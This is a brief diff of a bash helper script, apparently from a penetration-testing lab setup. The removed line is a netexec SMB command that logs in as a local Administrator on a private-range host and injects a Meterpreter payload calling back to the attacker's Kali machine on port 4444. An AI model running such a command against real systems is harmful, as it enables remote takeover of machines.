@@ -1,7 +1,6 @@
 #!/bin/bash
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/run_with_proxychains.sh
 
-paste_command "proxychains netexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=4444"
- 
+run_with_proxychains $0
